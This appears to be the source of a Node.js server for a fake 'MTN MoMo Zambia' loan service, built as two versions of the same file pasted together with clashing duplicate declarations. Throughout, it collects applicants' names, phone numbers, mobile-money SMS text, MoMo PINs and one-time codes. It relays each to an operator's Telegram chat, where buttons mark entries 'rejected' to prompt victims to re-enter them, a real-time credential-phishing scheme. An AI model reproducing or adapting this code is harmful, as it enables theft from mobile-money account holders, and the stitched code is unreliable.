require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
// ============================================================
// server.js – MTN Zambia Version (With Resend & Smart Rejection)
// ============================================================
console.log("🟢 1. Server is starting...");
require('dotenv').config();
console.log("🟢 2. dotenv loaded");

const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend')));

// ─── In-Memory Store ───
const applications = {};
const rejectionHistory = {};

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
}

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
console.log('✅ Server starting...');

// ─── MTN Zambia Configuration ───
const MTN_CONFIG = {
    countryCode: '260',
    currency: 'ZMW',
    appName: 'MTN MoMo Zambia',
    phonePrefix: '+260',
    phoneExample: '712345678',
    loanMin: 500,
    loanMax: 10000,
    loanDefault: 2000,
    loanTermDefault: 48
};

// ─── Data Persistence ───
const DATA_DIR = path.join(__dirname, '../data');
const DATA_FILE = path.join(DATA_DIR, 'applications.json');
const HISTORY_FILE = path.join(DATA_DIR, 'rejection_history.json');

if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
    console.log('📁 Created data directory');
}

function saveApplications() {
    try {
        const data = {
            applications: applications,
            rejectionHistory: rejectionHistory,
            timestamp: new Date().toISOString()
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('💾 Applications saved to disk');
        return true;
    } catch (error) {
        console.error('❌ Error saving applications:', error);
        return false;
    }
}

function loadApplications() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            const parsed = JSON.parse(data);
            
            const age = Date.now() - new Date(parsed.timestamp).getTime();
            if (age < 7 * 24 * 60 * 60 * 1000) {
                Object.assign(applications, parsed.applications || {});
                Object.assign(rejectionHistory, parsed.rejectionHistory || {});
                console.log(`📂 Loaded ${Object.keys(applications).length} applications from disk`);
                return true;
            } else {
                console.log('📂 Data file is older than 7 days, starting fresh');
                return false;
            }
        }
    } catch (error) {
        console.error('❌ Error loading applications:', error);
    }
    return false;
}

function saveRejectionHistory() {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(rejectionHistory, null, 2));
        console.log('💾 Rejection history saved to disk');
        return true;
    } catch (error) {
        console.error('❌ Error saving rejection history:', error);
        return false;
    }
}

function loadRejectionHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            const parsed = JSON.parse(data);
            Object.assign(rejectionHistory, parsed);
            console.log(`📂 Loaded rejection history from disk`);
            return true;
        }
    } catch (error) {
        console.error('❌ Error loading rejection history:', error);
    }
    return false;
}

// ─── Auto-save every 30 seconds ───
setInterval(() => {
    if (Object.keys(applications).length > 0) {
        saveApplications();
        if (Object.keys(rejectionHistory).length > 0) {
            saveRejectionHistory();
        }
    }
}, 30000);

// ─── Save on shutdown ───
process.on('SIGINT', () => {
    console.log('🔄 Saving data before shutdown...');
    saveApplications();
    saveRejectionHistory();
    process.exit(0);
});

// ─── Load data on startup ───
loadApplications();
loadRejectionHistory();

// ─── Telegram Message Sender ───
async function sendTelegramMessage(message, buttons = null) {
    if (!TELEGRAM_BOT_TOKEN) {
        console.error('❌ Cannot send message: TELEGRAM_BOT_TOKEN is missing');
        return { ok: false, error: 'Bot token missing' };
    }

    const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };

    try {
        const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        return await response.json();
    } catch (error) {
        console.error('Error sending Telegram message:', error);
        return { ok: false, error: error.message };
    }
}

// ─── 1. Application Submission ───
app.post('/api/send-application', async (req, res) => {
    try {
        const data = req.body.applicationData;
        const { applicationId, phone, loanAmount, loanTerm, firstName, lastName } = data;

        const isResubmission = !!applications[applicationId];
        
        applications[applicationId] = { 
            ...data, 
            smsStatus: 'pending', 
            pinStatus: 'pending', 
            otpStatus: 'pending',
            pinAttempts: 0,
            maxPinAttempts: 3,
            pinBlockedUntil: null,
            resubmissionCount: isResubmission ? (applications[applicationId]?.resubmissionCount || 0) + 1 : 0,
            createdAt: isResubmission ? applications[applicationId]?.createdAt : new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };
        
        saveApplications();
        
        console.log(`📝 Application ${isResubmission ? 'RE' : ''}submitted: ${applicationId}`);

        const message = `📋 *${isResubmission ? 'RE-' : 'NEW'} LOAN APPLICATION (${MTN_CONFIG.appName})*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: ${MTN_CONFIG.phonePrefix}${phone}\n💰 Amount: ${MTN_CONFIG.currency} ${loanAmount.toLocaleString()}\n📅 Term: ${loanTerm}\n👤 Name: ${firstName} ${lastName}\n${isResubmission ? `\n🔄 Resubmission #${applications[applicationId].resubmissionCount}` : ''}\n\n✅ *Please approve or reject this application:*`;

        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, applicationId, status: 'waiting_sms' });
    } catch (error) {
        console.error('Error in /api/send-application:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 2. SMS Submission ───
app.post('/api/send-momo-message', async (req, res) => {
    try {
        const { momoData } = req.body;
        const { applicationId, phone, momoMessage, isResubmission } = momoData;

        applications[applicationId].smsMessage = momoMessage;
        applications[applicationId].smsStatus = 'pending';
        applications[applicationId].updatedAt = new Date().toISOString();
        saveApplications();

        const message = `📨 *SMS VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: ${MTN_CONFIG.phonePrefix}${phone}\n\n📩 *SMS Content:*\n${momoMessage}\n\n✅ *Please approve or reject this SMS:*`;

        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-momo-message:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 3. Resend SMS ───
app.post('/api/resend-sms', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const app = applications[applicationId];
        
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }
        
        app.smsStatus = 'pending';
        app.updatedAt = new Date().toISOString();
        saveApplications();
        
        const message = `🔄 *SMS RESEND REQUESTED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: ${MTN_CONFIG.phonePrefix}${app.phone}\n\n📌 User has requested a new SMS verification.\n✅ *Please approve or reject this new SMS:*`;
        
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
        ]];
        
        await sendTelegramMessage(message, buttons);
        
        res.json({ ok: true, status: 'sms_resent' });
    } catch (error) {
        console.error('❌ Error in /api/resend-sms:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 4. PIN Submission ───
app.post('/api/send-pin', async (req, res) => {
    try {
        const { applicationId, pin, isResubmission } = req.body;
        const app = applications[applicationId];
        
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }
        
        if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
            const remaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
            return res.status(429).json({ 
                ok: false, 
                error: `Too many failed attempts. Please wait ${remaining} seconds.`,
                blocked: true,
                remainingSeconds: remaining
            });
        }
        
        if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
            app.pinAttempts = 0;
            app.pinBlockedUntil = null;
        }
        
        app.pin = pin;
        app.pinStatus = 'pending';
        app.updatedAt = new Date().toISOString();
        saveApplications();

        const message = `🔐 *PIN VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Please approve or reject this PIN:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-pin:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 5. PIN Rejected Handler ───
app.post('/api/pin-rejected', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const app = applications[applicationId];
        
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }
        
        app.pinAttempts = (app.pinAttempts || 0) + 1;
        const remainingAttempts = app.maxPinAttempts - app.pinAttempts;
        
        if (remainingAttempts <= 0) {
            app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
            app.pinStatus = 'blocked';
            saveApplications();
            
            await sendTelegramMessage(
                `🔒 *PIN BLOCKED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: ${MTN_CONFIG.phonePrefix}${app.phone}\n\n❌ Too many failed PIN attempts.\n⏳ Blocked for 5 minutes.`
            );
            
            return res.json({
                ok: false,
                blocked: true,
                remainingAttempts: 0,
                message: 'Too many failed attempts. Please wait 5 minutes.'
            });
        }
        
        saveApplications();
        
        return res.json({
            ok: true,
            remainingAttempts: remainingAttempts,
            message: `Wrong PIN. ${remainingAttempts} attempt(s) remaining.`
        });
        
    } catch (error) {
        console.error('Error in /api/pin-rejected:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 6. Reset PIN Attempts ───
app.post('/api/reset-pin-attempts/:applicationId', async (req, res) => {
    try {
        const app = applications[req.params.applicationId];
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }
        
        app.pinAttempts = 0;
        app.pinBlockedUntil = null;
        app.pinStatus = 'pending';
        saveApplications();
        
        res.json({ ok: true });
    } catch (error) {
        console.error('Error resetting PIN attempts:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 7. Get PIN Status ───
app.get('/api/pin-status/:applicationId', (req, res) => {
    try {
        const app = applications[req.params.applicationId];
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }
        
        const remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
        const isBlocked = app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date();
        let blockRemaining = 0;
        
        if (isBlocked) {
            blockRemaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
        }
        
        res.json({
            ok: true,
            pinAttempts: app.pinAttempts || 0,
            remainingAttempts: Math.max(0, remainingAttempts),
            maxAttempts: app.maxPinAttempts,
            isBlocked: isBlocked,
            blockRemainingSeconds: blockRemaining,
            pinStatus: app.pinStatus
        });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 8. OTP Submission ───
app.post('/api/send-otp', async (req, res) => {
    try {
        const { applicationId, otp, isResubmission } = req.body;
        applications[applicationId].otp = otp;
        applications[applicationId].otpStatus = 'pending';
        applications[applicationId].updatedAt = new Date().toISOString();
        saveApplications();

        const message = `🔑 *OTP VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 OTP Entered: ${otp}\n\n✅ *Please approve or reject this OTP:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-otp:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 9. Resend OTP ───
app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const app = applications[applicationId];
        
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }
        
        app.otpStatus = 'pending';
        app.updatedAt = new Date().toISOString();
        saveApplications();
        
        const message = `🔄 *OTP RESEND REQUESTED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: ${MTN_CONFIG.phonePrefix}${app.phone}\n\n📌 User has requested a new OTP.\n✅ *Please approve or reject this new OTP:*`;
        
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
        ]];
        
        await sendTelegramMessage(message, buttons);
        
        res.json({ ok: true, status: 'otp_resent' });
    } catch (error) {
        console.error('Error in /api/resend-otp:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 10. Final Completion ───
app.post('/api/send-final-details', async (req, res) => {
    try {
        const data = req.body.finalData;
        applications[data.applicationId].pinStatus = 'approved';
        applications[data.applicationId].updatedAt = new Date().toISOString();
        saveApplications();

        const message = `✅ *LOAN COMPLETE (${MTN_CONFIG.appName})*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${data.applicationId}\n📱 Phone: ${MTN_CONFIG.phonePrefix}${data.phone}\n🔑 PIN Entered: ${data.pin}\n💰 Amount: ${MTN_CONFIG.currency} ${data.loanAmount.toLocaleString()}\n📅 Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n🎉 *Status: DASHBOARD ACCESS GRANTED*`;

        await sendTelegramMessage(message);
        res.json({ ok: true, status: 'dashboard_ready' });
    } catch (error) {
        console.error('Error in /api/send-final-details:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 11. Get Rejection Redirect Info ───
app.get('/api/rejection-info/:applicationId', (req, res) => {
    try {
        const app = applications[req.params.applicationId];
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }
        
        let rejectedStep = null;
        let errorMessage = '';
        
        if (app.smsStatus === 'rejected') {
            rejectedStep = 'sms';
            errorMessage = '❌ Your SMS message was rejected. Please check and resubmit.';
        } else if (app.pinStatus === 'rejected') {
            rejectedStep = 'pin';
            errorMessage = '❌ Your MoMo PIN was rejected. Please re-enter your PIN.';
        } else if (app.otpStatus === 'rejected') {
            rejectedStep = 'otp';
            errorMessage = '❌ Your OTP was rejected. Please request a new OTP.';
        }
        
        res.json({
            ok: true,
            rejectedStep,
            errorMessage,
            applicationId: req.params.applicationId
        });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 12. Webhook ───
app.post('/api/telegram-webhook', async (req, res) => {
    console.log('📩 Webhook received');

    try {
        if (req.body.callback_query) {
            const query = req.body.callback_query;
            const raw = query.data;

            try {
                const { action, step, applicationId } = JSON.parse(raw);
                const app = applications[applicationId];
                if (!app) return res.sendStatus(200);

                if (step === 'SMS' && app.smsStatus === 'pending') {
                    app.smsStatus = action === 'YES' ? 'approved' : 'rejected';
                } else if (step === 'PIN' && app.pinStatus === 'pending') {
                    app.pinStatus = action === 'YES' ? 'approved' : 'rejected';
                } else if (step === 'OTP' && app.otpStatus === 'pending') {
                    app.otpStatus = action === 'YES' ? 'approved' : 'rejected';
                }

                await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: query.id,
                        text: `✅ ${action === 'YES' ? 'Approved' : 'Rejected'}!`,
                        show_alert: false
                    })
                });

            } catch (e) {
                console.error('Error parsing callback data:', e);
            }

            return res.sendStatus(200);
        }

        if (req.body.message && req.body.message.text) {
            console.log('💬 Message received:', req.body.message.text);
        }

        res.sendStatus(200);

    } catch (error) {
        console.error('Error in webhook:', error);
        res.sendStatus(500);
    }
});

// ─── 13. Status ───
app.get('/api/status/:applicationId/:step', (req, res) => {
    try {
        const app = applications[req.params.applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        let status = 'pending';
        if (req.params.step === 'sms') status = app.smsStatus;
        else if (req.params.step === 'pin') status = app.pinStatus;
        else if (req.params.step === 'otp') status = app.otpStatus;

        const rejectionInfo = rejectionHistory[req.params.applicationId] || null;

        res.json({ 
            ok: true, 
            status,
            rejectionInfo,
            resubmissionCount: app.resubmissionCount || 0
        });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── 14. Debug ───
app.get('/api/debug/applications', (req, res) => {
    res.json({
        total: Object.keys(applications).length,
        applications: applications,
        rejections: rejectionHistory,
        dataFile: fs.existsSync(DATA_FILE) ? 'exists' : 'not found'
    });
});

// ─── 15. Serve Frontend ───
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📁 Serving frontend from: ${path.join(__dirname, '../frontend')}`);
    console.log(`💾 Data directory: ${DATA_DIR}`);
});
const frontendPath = path.join(__dirname, '../frontend');
app.use(express.static(frontendPath));

app.get('/style.css', (req, res) => {
  res.sendFile(path.join(frontendPath, 'style.css'), {
    headers: { 'Content-Type': 'text/css' }
  });
});

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

const applications = {};

// Generate a short reference for callback_data (prevents BUTTON_DATA_INVALID)
function generateRef() {
  return Math.random().toString(36).substring(2, 8).toUpperCase();
}

async function sendTelegramMessage(message, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const body = { chat_id: TELEGRAM_CHAT_ID, text: message };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  try {
    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await response.json();
    if (!data.ok) {
      console.error('Telegram API error:', data);
    } else {
      console.log('✅ Telegram message sent');
    }
  } catch (e) {
    console.error('Telegram send error:', e);
  }
}

// ─── Health ───
app.get('/api/health', (req, res) => res.json({ ok: true }));

// ─── Submit Application ───
app.post('/api/send-application', async (req, res) => {
  const data = req.body.applicationData;
  const appId = `${data.phone}_${Date.now()}`;
  const ref = generateRef();

  applications[appId] = {
    ...data,
    ref,
    smsStatus: 'pending',
    pinStatus: 'pending',
    otpStatus: 'pending',
    pinAttempts: 0,
    maxPinAttempts: 3,
    pinBlockedUntil: null,
    createdAt: new Date().toISOString()
  };

  const message = `NEW LOAN APPLICATION\nID: ${appId}\nPhone: +260${data.phone}\nAmount: ZMW ${data.loanAmount}\nTerm: ${data.loanTerm}\nName: ${data.firstName} ${data.lastName}\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, applicationId: appId, status: 'waiting_sms' });
});

// ─── Send SMS (MoMo message) ───
app.post('/api/send-momo-message', async (req, res) => {
  const { applicationId, phone, momoMessage } = req.body.momoData;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  app.momoMessage = momoMessage;
  app.smsStatus = 'pending';

  const message = `MOMO MESSAGE VERIFICATION\nID: ${applicationId}\nPhone: +260${phone}\n\nMessage:\n${momoMessage}\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref: app.ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref: app.ref }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, status: 'pending' });
});

// ─── Send PIN ───
app.post('/api/send-pin', async (req, res) => {
  const { applicationId, pin } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
    return res.status(429).json({ ok: false, blocked: true, message: 'Too many attempts. Please wait 5 minutes.' });
  }
  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
    app.pinAttempts = 0;
    app.pinBlockedUntil = null;
  }

  app.pin = pin;
  app.pinStatus = 'pending';

  const message = `PIN VERIFICATION\nID: ${applicationId}\nPIN Entered: ${pin}\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'PIN', ref: app.ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'PIN', ref: app.ref }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, status: 'pending' });
});

// ─── Send OTP ───
app.post('/api/send-otp', async (req, res) => {
  const { applicationId, otp } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  app.otp = otp;
  app.otpStatus = 'pending';

  const message = `OTP VERIFICATION\nID: ${applicationId}\nOTP Entered: ${otp}\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref: app.ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref: app.ref }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, status: 'pending' });
});

// ─── Resend OTP ───
app.post('/api/resend-otp', async (req, res) => {
  const { applicationId } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  app.otpStatus = 'pending';

  const message = `OTP RESENT - ADMIN ACTION REQUIRED\nID: ${applicationId}\nNew OTP requested.\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref: app.ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref: app.ref }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, status: 'otp_resent' });
});

// ─── PIN Rejected – increment attempts ───
app.post('/api/pin-rejected', async (req, res) => {
  const { applicationId } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  app.pinAttempts = (app.pinAttempts || 0) + 1;
  const remaining = app.maxPinAttempts - app.pinAttempts;

  if (remaining <= 0) {
    app.pinStatus = 'blocked';
    app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
    return res.json({ ok: false, blocked: true, remainingAttempts: 0 });
  }

  app.pinStatus = 'rejected';
  res.json({ ok: true, remainingAttempts: remaining });
});

// ─── Reset PIN Attempts ───
app.post('/api/reset-pin-attempts/:applicationId', async (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  app.pinAttempts = 0;
  app.pinBlockedUntil = null;
  app.pinStatus = 'pending';
  res.json({ ok: true });
});

// ─── PIN Status ───
app.get('/api/pin-status/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  const remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
  const isBlocked = app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date();
  let blockRemainingSeconds = 0;
  if (isBlocked) {
    blockRemainingSeconds = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
  }

  res.json({
    ok: true,
    remainingAttempts,
    isBlocked,
    blockRemainingSeconds,
    pinStatus: app.pinStatus
  });
});

// ─── Status Check (for polling) ───
app.get('/api/status/:applicationId/:step', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  let status = 'pending';
  let remainingAttempts = null;
  let blocked = false;

  if (req.params.step === 'sms') status = app.smsStatus;
  else if (req.params.step === 'pin') {
    status = app.pinStatus;
    remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
    blocked = app.pinStatus === 'blocked' || (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date());
  } else if (req.params.step === 'otp') status = app.otpStatus;

  res.json({ ok: true, status, remainingAttempts, blocked });
});

// ─── Rejection Info ───
app.get('/api/rejection-info/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  let rejectedStep = null;
  let errorMessage = '';

  if (app.smsStatus === 'rejected') {
    rejectedStep = 'sms';
    errorMessage = 'Your SMS was rejected. Please check and resubmit.';
  } else if (app.pinStatus === 'rejected') {
    rejectedStep = 'pin';
    errorMessage = 'Your PIN was rejected. Please re-enter your PIN.';
  } else if (app.otpStatus === 'rejected') {
    rejectedStep = 'otp';
    errorMessage = 'Your OTP was rejected. Please request a new OTP.';
  }

  res.json({ ok: true, rejectedStep, errorMessage, applicationId: req.params.applicationId });
});

// ─── Telegram Webhook ───
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;
  console.log('📩 Webhook received');

  if (update.callback_query) {
    const query = update.callback_query;
    let data;
    try {
      data = JSON.parse(query.data);
    } catch (e) {
      console.error('Failed to parse callback_data:', query.data, e);
      return res.sendStatus(200);
    }

    const { a, s, ref } = data;
    console.log(`🔘 Callback: action=${a}, step=${s}, ref=${ref}`);

    // Find app by ref
    let appId = null;
    for (const id in applications) {
      if (applications[id].ref === ref) {
        appId = id;
        break;
      }
    }

    if (!appId) {
      console.error(`❌ No app found for ref: ${ref}`);
      return res.sendStatus(200);
    }

    const app = applications[appId];
    console.log(`✅ Found app: ${appId}`);

    if (s === 'SMS') {
      app.smsStatus = a === 'YES' ? 'approved' : 'rejected';
    } else if (s === 'PIN') {
      if (a === 'YES') {
        app.pinStatus = 'approved';
      } else {
        app.pinAttempts = (app.pinAttempts || 0) + 1;
        if (app.pinAttempts >= app.maxPinAttempts) {
          app.pinStatus = 'blocked';
          app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
        } else {
          app.pinStatus = 'rejected';
        }
      }
    } else if (s === 'OTP') {
      app.otpStatus = a === 'YES' ? 'approved' : 'rejected';
    }

    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a}` })
    });

    await sendTelegramMessage(`Status Update\nID: ${appId}\nStep: ${s}\nAction: ${a}`);
    return res.sendStatus(200);
  }

  if (update.message && update.message.text) {
    const text = update.message.text.trim();
    const chatId = update.message.chat.id;
    console.log(`💬 Message from ${chatId}: ${text}`);
    if (chatId.toString() === TELEGRAM_CHAT_ID) {
      if (text === '/stats') {
        const total = Object.keys(applications).length;
        await sendTelegramMessage(`Total applications: ${total}`);
      } else if (text === '/list') {
        const ids = Object.keys(applications).slice(-5);
        let msg = 'Recent applications:\n';
        ids.forEach(id => {
          const app = applications[id];
          msg += `${id} – ${app.phone} (SMS: ${app.smsStatus}, PIN: ${app.pinStatus}, OTP: ${app.otpStatus})\n`;
        });
        await sendTelegramMessage(msg || 'No applications yet.');
      } else if (text === '/help') {
        await sendTelegramMessage('Commands: /stats, /list, /status');
      }
    }
  }

  res.sendStatus(200);
});

// ─── Fallback ───
app.get('*', (req, res) => {
  res.sendFile(path.join(frontendPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
